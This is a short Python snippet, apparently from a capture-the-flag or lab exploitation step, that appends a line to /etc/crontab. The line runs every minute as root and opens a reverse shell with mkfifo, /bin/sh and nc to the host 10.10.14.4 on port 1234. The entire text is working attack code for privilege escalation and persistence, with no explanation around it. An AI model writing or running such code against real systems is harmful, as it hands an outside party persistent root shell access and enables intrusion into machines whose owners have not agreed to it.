shell = '''
* * * * * root rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.4 1234 > /tmp/f
'''
f = open('/etc/crontab', 'a')
f.write(shell)
f.close()
